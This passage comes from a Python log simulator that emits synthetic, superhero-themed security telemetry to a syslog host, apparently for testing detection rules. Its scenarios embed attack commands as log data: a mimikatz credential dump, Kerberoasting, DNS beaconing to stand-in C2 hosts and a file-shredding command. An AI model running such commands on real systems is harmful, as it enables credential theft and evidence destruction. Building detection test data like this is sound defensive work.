    transaction burst, security framing only."""
    ip, host = "64.124.201.9", "station-lasvegas-01.lexcorp.com"
    program = "AVENGERS"
    op = next(o for o in OPERATIVES if o["name"] == "phil.coulson")
    login = _cloudtrail_event(op, program, "ConsoleLogin", "signin.amazonaws.com", source_ip=ip,
                               response_elements={"ConsoleLogin": "Success"})
    lines = [_duo_line("gl-auth-proxy02.lexcorp.com", "coulson", "S.H.I.E.L.D.", "LexCorp Inc. AnyConnect",
                       ip, "success", "user_approved") for _ in range(3)]
    lines.append(_cloudtrail_line(login))
    lines.append(_db_line("phil.coulson", "public.wire_transfers", "SELECT", "READ",
                          "SELECT * FROM wire_transfers WHERE city='Las Vegas'", 47))
    return ("Multiverse-Adjacent Travel Anomaly — correlated login/financial-transaction burst", lines)

def sc_accords_breach_lateral():
    """ACCORDS BREACH LATERAL MOVEMENT — kerberoasting/lateral movement in the
    legal/accounting domain amid the Sokovia Accords dispute (AVENGERS-internal)."""
    comp = "AVENGERS-DB01"
    cmd = _proc("cmd.exe", "cmd.exe /c mimikatz.exe", user="sam.wilson")
    mimikatz = _proc("mimikatz.exe", "mimikatz.exe \"sekurlsa::logonpasswords\" exit",
                      display_name="mimikatz.exe", user="sam.wilson", parent=cmd)
    proc_event = _edr_event("Process Creation", comp, tgt_process=mimikatz)
    return ("Accords Breach Lateral Movement — kerberoasting the legal/accounting service account", [
        _win_line("NEXUS-CORE-DC01", {"EventID": 4768, "Event": "A Kerberos authentication ticket (TGT) was requested",
                  "TargetUserName": "svc_legalacct", "TargetDomainName": "NEXUS.LOCAL", "IpAddress": "10.1.0.50"}),
        _win_line("NEXUS-CORE-DC01", {"EventID": 4769, "Event": "A Kerberos service ticket was requested",
                  "TargetUserName": "svc_legalacct@NEXUS.LOCAL", "ServiceName": "MSSQLSvc/avengers-db01",
                  "TicketEncryptionType": "0x17", "IpAddress": "10.1.0.50"}, sev=4),
        _win_line(comp, {"EventID": 4624, "Event": "An account was successfully logged on", "LogonType": 3,
                  "LogonTypeName": "Network", "TargetUserName": "svc_legalacct", "TargetDomainName": "NEXUS",
                  "IpAddress": "10.1.0.50"}),
        _db_line("sam.wilson", "public.faction_agreements", "SELECT", "READ",
                 "SELECT * FROM faction_agreements WHERE label='avengers'", 340),
        _edr_line(proc_event, sev=2),
    ])

def sc_xmen_solo_ops_sprawl():
    """X-MEN SOLO OPS SPRAWL — excessive lateral credential correlation
    across individually-run solo-op cover identities."""
    members = [("logan.howlett", "wolverine", "soloop-wolverine-01.lexcorp.com"),
               ("scott.summers", "cyclops", "soloop-gambit-01.lexcorp.com"),
               ("ororo.munroe", "storm", "soloop-storm-01.lexcorp.com"),
               ("jean.grey", "phoenix", "soloop-phoenix-01.lexcorp.com"),
               ("hank.mccoy", "beast", "soloop-beast-01.lexcorp.com")]
    lines = []
    for name, alias, host in members:
        lines.append(_duo_line("gl-auth-proxy01.lexcorp.com", alias, "X-MEN", "X-Men Solo Ops Comms",
                               "173.245.10.88", "success", "user_approved"))
        lines.append(_ssh_line(host, f"Accepted publickey for {name} from 173.245.10.88 port "
                               f"{random.randint(49152,65535)} ssh2: RSA SHA256:"+_fake_sha256()))
    lines.append(_panw_ids_line("noc-ids01.lexcorp.com", PANW_NARRATIVE_SIGNATURES["sprawl"], "173.245.10.88", "10.3.0.1"))
    return ("X-Men Solo Ops Sprawl — credential correlation across individually-run solo-op identities", lines)

def sc_hydra_defection():
    """HYDRA DEFECTION — Bucky Barnes rotates credentials off HYDRA and onto
    the Avengers after breaking his conditioning."""
    ip = "96.8.124.201"
    return ("HYDRA Defection — Bucky Barnes rotates credentials off HYDRA onto Avengers", [
        _duo_line("gl-auth-proxy02.lexcorp.com", "winter.soldier", "HYDRA", "HYDRA Admin Portal",
                  ip, "denied", "locked_out"),
        _sudo_line("station-metropolis-01.lexcorp.com", "bucky.barnes", "/opt/aftermath/bin/rotate_creds.py --from hydra --to avengers"),
        _duo_line("gl-auth-proxy01.lexcorp.com", "winter.soldier", "AVENGERS", "Avengers Power Registry Portal",
                  ip, "success", "user_approved"),
        _win_line("NEXUS-CORE-DC01", {"EventID": 4740, "Event": "A user account was locked out",
                  "TargetUserName": "winter.soldier", "CallerComputerName": "AVENGERS-DB01"}, sev=4),
    ])

def sc_civil_war_access_revocation():
    """CIVIL WAR ACCESS REVOCATION — the well-documented Sokovia Accords split
    inside the Avengers: a S.H.I.E.L.D. enforcer revokes access for
    Accords-non-compliant members."""
    ip = "24.116.10.201"
    return ("Civil War Access Revocation — Sokovia Accords enforcement revokes non-compliant Avengers' access", [
        _duo_line("gl-auth-proxy01.lexcorp.com", "maria.hill", "S.H.I.E.L.D.", "LexCorp Inc. AnyConnect",
                  ip, "success", "user_approved"),
        _sudo_line("lexcorp-annex02.lexcorp.com", "maria.hill", "/opt/avengers/bin/revoke_access.sh --label avengers --reason CIVIL-WAR-ACCORDS-SPLIT"),
        _panw_traffic_line("station-metropolis-01.lexcorp.com", "96.8.124.201", "10.1.0.1", 443, "ssl", action="deny", sev=4),
        _win_line("NEXUS-CORE-DC01", {"EventID": 4740, "Event": "A user account was locked out",
                  "TargetUserName": "captain.america", "CallerComputerName": "AVENGERS-DB01"}, sev=4),
    ])

def sc_green_lantern_recharge_anomaly():
    """GREEN LANTERN RECHARGE ANOMALY — a ring credential is reissued
    (Windows 4724 password-reset equivalent) and immediately re-authenticates
    from a recharge-station host it's never touched before. Reuses the same
    join shape as the account-provisioning detections (F1: a credential
    lifecycle event + an immediate success login for the same identity) --
    here the anomaly is an existing ring showing up somewhere new right after
    a reset, not a brand-new account, so it's a distinct detection from the
    Kyle Rayner onboarding scenario."""
    ip, host = "24.98.10.201", "station-oa-01.lexcorp.com"
    return ("Green Lantern Recharge Anomaly — ring reissued, immediately re-authenticates from an unfamiliar recharge station", [
        _win_line("NEXUS-CORE-DC01", {"EventID": 4724, "Event": "An attempt was made to reset an account's password",
                  "TargetUserName": "simon.baz", "TargetDomainName": "NEXUS", "SubjectUserName": "green.lantern"}),
        _duo_line("gl-auth-proxy02.lexcorp.com", "green.lantern", "GREEN-LANTERNS", "LexCorp Inc. AnyConnect",
                  ip, "success", "user_approved"),
        _http_line(host, ip, "simon.baz", "GET", "/intel/db/passport?alias=green.lantern", 200, 4110),
        _panw_traffic_line(host, ip, "10.3.0.1", 443, "ssl"),
    ])

def sc_jleague_financial_audit():
    """JUSTICE LEAGUE FINANCIAL AUDIT — mass DB-extraction, business-audit
    framing."""
    ip = "24.185.12.60"
    return ("Justice League Financial Audit — mass DB extraction for a business/financial audit", [
        _win_line("JLEAGUE-GOTHAM-HQ01", {"EventID": 4624, "Event": "An account was successfully logged on",
                  "LogonType": 10, "LogonTypeName": "RemoteInteractive", "TargetUserName": "bruce.wayne",
                  "TargetDomainName": "NEXUS", "IpAddress": ip}),
        _db_line("bruce.wayne", "public.wire_transfers", "SELECT", "READ",
                 "SELECT * FROM wire_transfers WHERE label='jleague'", 1847),
        _db_line("bruce.wayne", "public.faction_agreements", "SELECT", "READ",
                 "SELECT * FROM faction_agreements WHERE label='jleague'", 612),
        _http_line("jleague-audit01.lexcorp.com", ip, "bruce.wayne", "GET", "/audit/jleague/financial-review", 200, 55210),
    ])

def sc_wakanda_infra_standup():
    """WAKANDA INFRA STANDUP — Wakanda's sovereign infra stood up and probed
    by a rival (the rival is an anonymous external IP, not attributed to any
    named person)."""
    ip, host = "68.202.14.55", "wakanda-hq01.lexcorp.com"
    return ("Wakanda Infra Standup — new sovereign infra probed by a rival faction network", [
        _duo_line("gl-auth-proxy01.lexcorp.com", "black.panther", "WAKANDA", "Wakanda Infra Admin Portal",
                  "24.185.12.60", "success", "user_approved"),
        _http_line(host, "24.185.12.60", "tchalla.udaku", "POST", "/ops/wakanda/infra-standup", 201, 2044),
        _panw_traffic_line(host, ip, "10.4.0.1", 443, "ssl", action="deny", sev=4),
        _panw_ids_line("noc-ids01.lexcorp.com", PANW_NARRATIVE_SIGNATURES["recon"], ip, "10.4.0.1"),
        _audit_line(host, ip, "10.4.0.1", 443),
    ])

def sc_gotham_wakanda_rivalry():
    """GOTHAM ROGUE VS. WAKANDA RIVALRY — DNS beaconing/proxy correlation
    between rival networks, framed purely as network telemetry."""
    host, client = "station-gotham-01.lexcorp.com", "10.4.0.1"
    return ("Gotham Rogue vs. Wakanda Rivalry — proxy/DNS correlation between rival networks", [
        _duo_line("gl-auth-proxy01.lexcorp.com", "harley.quinn", "GOTHAM-ROGUE", "Gotham Rogue Archive Access",
                  "68.202.14.55", "success", "user_approved"),
        _dns_line(host, client, "c2.eastcoast.example.net", "TXT", sev=4),
        _panw_ids_line("noc-ids01.lexcorp.com", PANW_NARRATIVE_SIGNATURES["beacon"], "68.202.14.55", client),
        _proxy_line("wakanda-hq01.lexcorp.com", "10.4.0.1", "TCP_TUNNEL", 200, 92344, "CONNECT",
                    "c2.eastcoast.example.net:443", "harley.quinn", "HIER_DIRECT/24.185.12.60", "-"),
        _http_line(host, "68.202.14.55", "tchalla.udaku", "GET", "/intel/db/search?q=quinn+harley", 200, 8811),
    ])

def sc_shield_internal_watchdog():
    """S.H.I.E.L.D. INTERNAL WATCHDOG — a HYDRA mole embedded inside
    S.H.I.E.L.D. (Grant Ward) triggers a PR-crisis/leaked-internal-memo
    insider scenario."""
    ip = "142.11.209.40"
    return ("S.H.I.E.L.D. Internal Watchdog — leaked internal memo exposes a HYDRA mole", [
        _win_line("NEXUS-CORE-DC01", {"EventID": 4624, "Event": "An account was successfully logged on",
                  "LogonType": 2, "LogonTypeName": "Interactive", "TargetUserName": "grant.ward",
                  "TargetDomainName": "NEXUS", "IpAddress": ip}),
        _db_line("grant.ward", "public.insider_watchlist", "SELECT", "READ",
                 "SELECT * FROM insider_watchlist WHERE label='shield'", 47),
        _email_line(_mimecast_event(recipient="grant.ward@"+email_domain("S.H.I.E.L.D."), sender_name="Grant Ward",
                    sender="agent.ward@hydra-cell.example.org", subject="Internal memo — HYDRA infiltration PR crisis draft response",
                    direction="outbound", event_type="TTP Impersonation Protection",
                    malicious=True, blocked=False)),
        _sudo_line("station-wakanda-01.lexcorp.com", "grant.ward", "/usr/bin/shred -u /intel/archive/shield-memo-draft.pdf"),
        _panw_ids_line("noc-ids01.lexcorp.com", PANW_NARRATIVE_SIGNATURES["insider"], "10.0.0.1", "172.16.0.1"),
    ])

def sc_asgard_avengers_trust_pact():
    """ASGARD/AVENGERS TRUST PACT — cross-faction data-sharing between
    Asgard and the Avengers: an identity-federation/excessive-trust-
    relationship scenario."""
    ip = "99.203.14.60"
    return ("Asgard/Avengers Trust Pact — excessive cross-faction trust relationship", [
        _duo_line("gl-auth-proxy01.lexcorp.com", "thor", "ASGARD", "Asgard Federation Portal",
                  ip, "success", "user_approved"),
        _duo_line("gl-auth-proxy01.lexcorp.com", "iron.man", "AVENGERS", "Avengers Archive Access",
                  "68.202.14.55", "success", "user_approved"),
        _panw_traffic_line("station-new-asgard-01.lexcorp.com", ip, "68.202.14.55", 443, "ssl"),
        _panw_ids_line("noc-ids01.lexcorp.com", PANW_NARRATIVE_SIGNATURES["trust"], ip, "68.202.14.55"),
        _http_line("station-gotham-01.lexcorp.com", "68.202.14.55", "thor.odinson", "GET",
                   "/secure/operative-registry", 200, 8811),
    ])

def sc_new_recruit_onboarding():
    """NEW RECRUIT ONBOARDING — Peter Parker joins the Avengers: new
    trusted-account provisioning."""
    ip, host = "173.174.10.201", "avengers-db01.lexcorp.com"
    return ("New Recruit Onboarding — new Avengers recruit account provisioning", [
        _win_line("NEXUS-CORE-DC01", {"EventID": 4624, "Event": "An account was successfully logged on",
                  "LogonType": 2, "LogonTypeName": "Interactive", "TargetUserName": "peter.parker",
                  "TargetDomainName": "NEXUS", "IpAddress": ip}),
        _duo_line("gl-auth-proxy01.lexcorp.com", "spider.man", "AVENGERS", "Avengers Power Registry Portal",
                  ip, "success", "user_approved"),
        _sudo_line(host, "peter.parker", "/opt/citadel/bin/onboard_recruit.sh --faction avengers --recruit spider.man"),
        _http_line(host, ip, "peter.parker", "POST", "/ops/avengers/recruit-onboarding", 201, 2044),
        _duo_line("gl-auth-proxy01.lexcorp.com", "spider.man", "AVENGERS", "Avengers Power Registry Portal",
                  ip, "success", "user_approved"),
    ])

def sc_infinity_vault_access():
    """INFINITY VAULT ACCESS — a single, uniquely restricted Infinity-Stone-
    related asset record: a legitimate, meticulously logged, one-time read
    of a uniquely gated vault object."""
    program = "X-MEN"
    op = next(o for o in OPERATIVES if o["name"] == "hank.mccoy")
    bucket = AWS_S3_BUCKETS[program]
    login = _cloudtrail_event(op, program, "ConsoleLogin", "signin.amazonaws.com",
                               response_elements={"ConsoleLogin": "Success"})
    single_get = _cloudtrail_event(op, program, "GetObject", "s3.amazonaws.com",
                                    request_params={"bucketName": bucket, "key": "singular/infinity-fragment-record.dat.enc"})
    return ("Infinity Vault Access — single restricted-access read of a uniquely gated vault object", [
        _cloudtrail_line(login),
        _cloudtrail_line(single_get, sev=4),
        _duo_line("gl-auth-proxy01.lexcorp.com", "beast", "X-MEN", "X-Men Solo Ops Comms",
                  "173.245.10.88", "success", "user_approved"),
    ])

def sc_banner_legal_hold():
    """BANNER LEGAL HOLD — a legitimate e-discovery legal hold: bulk read-only
    access to old power-registry/faction-agreement records for litigation."""
    ip, host = "142.254.10.88", "lexcorp-annex02.lexcorp.com"
    return ("Banner Legal Hold — e-discovery legal hold on old registry/agreement records", [
        _duo_line("gl-auth-proxy02.lexcorp.com", "the.hulk", "AVENGERS", "Legal Hold Review Portal",
                  ip, "success", "user_approved"),
        _db_line("bruce.banner", "public.faction_agreements", "SELECT", "READ",
                 "SELECT * FROM faction_agreements WHERE clause_type='sampling'", 1847),
        _db_line("bruce.banner", "public.cosmic_vault", "SELECT", "READ",
                 "SELECT * FROM cosmic_vault WHERE artist='bruce.banner'", 340),
        _http_line(host, ip, "bruce.banner", "GET", "/secure/operative-registry?hold=litigation", 200, 20481),
    ])

def sc_shield_shutdown():
    """S.H.I.E.L.D. SHUTDOWN — S.H.I.E.L.D. undergoes a restructure/shutdown
    (the well-documented post-Winter-Soldier dissolution): mutual credential
    revocation between two members' accounts."""
    ip, host = "142.11.209.40", "station-wakanda-01.lexcorp.com"
    return ("S.H.I.E.L.D. Shutdown — mutual credential revocation amid agency dissolution", [
        _sudo_line(host, "phil.coulson", "/opt/citadel/bin/revoke_access.sh --label shield --reason AGENCY-SHUTDOWN"),
        _duo_line("gl-auth-proxy01.lexcorp.com", "war.machine", "S.H.I.E.L.D.", "Facility RDP Gateway",
                  ip, "denied", "locked_out"),
        _win_line("NEXUS-CORE-DC01", {"EventID": 4740, "Event": "A user account was locked out",
                  "TargetUserName": "war.machine", "CallerComputerName": "NEXUS-CORE-DC01"}, sev=4),
        _duo_line("gl-auth-proxy01.lexcorp.com", "quake", "S.H.I.E.L.D.", "Facility RDP Gateway",
                  ip, "denied", "locked_out"),
    ])

def sc_kyle_rayner_onboarding():
    """KYLE RAYNER ONBOARDING — new-recruit account provisioning and
    immediate first login (first-login-after-provisioning pattern)."""
    ip, host = "23.243.10.90", "outpost-detroit-mi.lexcorp.com"
    return ("Kyle Rayner Onboarding — new-recruit account provisioning and first login", [
        _sudo_line("station-metropolis-01.lexcorp.com", "hal.jordan", "/opt/aftermath/bin/provision_artist.py --artist kyle.rayner"),
        _win_line("NEXUS-CORE-DC01", {"EventID": 4720, "Event": "A user account was created",
                  "TargetUserName": "kyle.rayner", "TargetDomainName": "NEXUS"}),
        _duo_line("gl-auth-proxy02.lexcorp.com", "ion", "GREEN-LANTERNS", "Green Lantern Corps Onboarding Portal",
                  ip, "success", "user_approved"),
        _http_line(host, ip, "kyle.rayner", "GET", "/intel/db/passport?alias=ion", 200, 4096),
    ])

def sc_squad_doom_rivalry():
    """SUICIDE SQUAD/LEGION OF DOOM RIVALRY — two competing factions: proxy/
    DNS correlation between their networks (business rivalry, not conflict)."""
    host, client = "station-belle-reve-01.lexcorp.com", "10.5.0.1"
    return ("Suicide Squad/Legion of Doom Rivalry — proxy/DNS correlation between rival networks", [
        _duo_line("gl-auth-proxy02.lexcorp.com", "lex.luthor", "LEGION-OF-DOOM", "Legion of Doom Distribution VPN",
                  "70.121.55.33", "success", "user_approved"),
        _dns_line(host, client, "c2.southern.example.net", "TXT", sev=4),
        _panw_ids_line("noc-ids01.lexcorp.com", PANW_NARRATIVE_SIGNATURES["beacon"], "173.174.10.201", client),
        _proxy_line("squad-hq01.lexcorp.com", "10.5.0.1", "TCP_TUNNEL", 200, 61234, "CONNECT",
                    "c2.southern.example.net:443", "lex.luthor", "HIER_DIRECT/173.174.10.201", "-"),
        _http_line(host, "173.174.10.201", "floyd.lawton", "GET", "/ops/doom/vendor-status", 200, 8811),
    ])

def sc_multiverse_nexus_audit():
    """MULTIVERSE NEXUS AUDIT — a single Watchmen auditor account touching
    3+ factions' power-registry schemas in one session: a cross-faction
    excessive-scope pattern. Ozymandias's own comic arc is built on exactly
    this kind of cross-faction reach, so the audit-scope-creep story fits
    him better than any single-faction operative."""
    ip, host = "99.44.10.201", "lexcorp-annex02.lexcorp.com"
    return ("Multiverse Nexus Audit — single account touching 3+ factions' schemas in one session", [
        _duo_line("gl-auth-proxy01.lexcorp.com", "ozymandias", "WATCHMEN", "Cross-Faction Audit Console",
                  ip, "success", "user_approved"),
        _db_line("adrian.veidt", "public.power_registry", "SELECT", "READ",
                 "SELECT * FROM power_registry WHERE label='avengers'", 340),
        _db_line("adrian.veidt", "public.power_registry", "SELECT", "READ",
                 "SELECT * FROM power_registry WHERE label='jleague'", 340),
        _db_line("adrian.veidt", "public.power_registry", "SELECT", "READ",
                 "SELECT * FROM power_registry WHERE label='wakanda'", 340),
        _http_line(host, ip, "adrian.veidt", "GET", "/api/v2/registry/avengers/power", 200, 9123),
    ])

def sc_hawkeye_shield_dispute():
    """HAWKEYE VS. S.H.I.E.L.D. ACCESS DISPUTE — a minor access-credit
    dispute: a small, targeted (below mass-extraction threshold) legal-
    records request. Illustrative detection-gap example, not a real incident."""
    ip, host = "24.98.10.201", "station-deerpark-01.lexcorp.com"
    return ("Hawkeye vs. S.H.I.E.L.D. Access Dispute — targeted legal-records request", [
        _duo_line("gl-auth-proxy02.lexcorp.com", "hawkeye", "AVENGERS", "Legal Hold Review Portal",
                  ip, "success", "user_approved"),
        _db_line("clint.barton", "public.faction_agreements", "SELECT", "READ",
                 "SELECT * FROM faction_agreements WHERE artist='hawkeye' AND label='shield'", 12),
        _http_line(host, ip, "clint.barton", "GET", "/secure/operative-registry?dispute=access-credit", 200, 4096),
    ])

SCENARIOS: list[Callable[[], tuple]] = [
    sc_cosmic_cube_heist_thanos, sc_oscorp_privesc, sc_nexus_registry_pull,
    sc_skrull_infiltration_talos, sc_avengers_xmen_beacon, sc_multiverse_travel_anomaly,
    sc_accords_breach_lateral, sc_xmen_solo_ops_sprawl, sc_hydra_defection,
    sc_civil_war_access_revocation, sc_green_lantern_recharge_anomaly, sc_jleague_financial_audit,
    sc_wakanda_infra_standup, sc_gotham_wakanda_rivalry, sc_shield_internal_watchdog,
    sc_asgard_avengers_trust_pact,
    sc_new_recruit_onboarding, sc_infinity_vault_access, sc_banner_legal_hold,
    sc_shield_shutdown, sc_kyle_rayner_onboarding, sc_squad_doom_rivalry,
    sc_multiverse_nexus_audit, sc_hawkeye_shield_dispute,
]

# ─── Generator registry ────────────────────────────────────────────────────────

GENERATORS: list[tuple[float, Callable[[], str]]] = [
    # (weight, generator_fn)
    (35, gen_panw_traffic),
    (15, gen_panw_deny),
    (10, gen_panw_globalprotect),
    (5,  gen_panw_threat),
    (10, gen_ssh_auth),
    (5,  gen_sudo_event),
    (5,  gen_pam_session),
    (5,  gen_apache_access),
    (3,  gen_cron_job),
    (2,  gen_kernel_audit),
    (10, gen_duo_auth),
    # gen_duo_admin is deliberately NOT in this pool -- see DUO_ADMIN_CHANCE
    # below. POPULATION is built by repeating each fn `weight` times
    # (range() needs an int), so the minimum expressible rate here is
    # 1-in-pool-size -- at this pool's size that's still ~250/day, far too
    # chatty for what's meant to be a rare, page-worthy admin action
    # (policy/group/secret-key changes, 2-3x/day). Gated independently
    # instead, at a fixed per-day target that stays correct even if
    # LOG_INTERVAL_MS changes.
    (10, gen_web_proxy),
    (12, gen_dns_query),
    (4,  gen_email_threat),
    (6,  gen_db_audit),
    (10, gen_win_event),
    (12, gen_cloudtrail_event),
    (15, gen_s1_edr_event),
]

POPULATION = [fn for weight, fn in GENERATORS for _ in range(weight)]

# ─── TCP sender ───────────────────────────────────────────────────────────────

def send_logs(sock: socket.socket) -> int:
    """Emit one burst. Occasionally fires a correlated Watchtower scenario instead.
    Returns the number of events sent."""
    if SCENARIOS and random.random() < SCENARIO_CHANCE:
        title, lines = random.choice(SCENARIOS)()
        log.info(f"[SCENARIO] {title} — {len(lines)} correlated events")
        for line in lines:
            if line is not None:  # EDR lines are ingested directly into SDL, nothing to send here
                sock.sendall(line.encode("utf-8"))
        return len(lines)

    if random.random() < DUO_ADMIN_CHANCE:
        line = gen_duo_admin()
        if line is not None:
            sock.sendall(line.encode("utf-8"))
        return 1

    if random.random() < DUO_RARE_CHANCE:
        line = gen_duo_auth(outcome=random.choice(_DUO_RARE_OUTCOMES))
        if line is not None:
            sock.sendall(line.encode("utf-8"))
        return 1

    for _ in range(BURST_SIZE):
        line = random.choice(POPULATION)()
        if line is not None:
            sock.sendall(line.encode("utf-8"))
    return BURST_SIZE

def connect() -> socket.socket:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((SYSLOG_HOST, SYSLOG_PORT))
    log.info(f"Connected to sgcia at {SYSLOG_HOST}:{SYSLOG_PORT}")
    return s

# ─── Main loop ────────────────────────────────────────────────────────────────

def main() -> None:
    log.info(
        f"Watchtower Log Simulator starting — "
        f"target={SYSLOG_HOST}:{SYSLOG_PORT} "
        f"burst={BURST_SIZE} interval={INTERVAL_MS}ms"
    )
    interval = INTERVAL_MS / 1000.0
    sock = None
    total = 0

    while True:
        try:
            if sock is None:
                sock = connect()

            sent = send_logs(sock)
            prev = total
            total += sent
            if total // 100 != prev // 100:
                log.info(f"[WATCHTOWER-SIM] {total} log events emitted")

        except (ConnectionRefusedError, OSError, BrokenPipeError) as exc:
            log.warning(f"Connection error: {exc} — retrying in 5s")
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass
            sock = None
            time.sleep(5)
            continue

        time.sleep(interval)

if __name__ == "__main__":
    main()
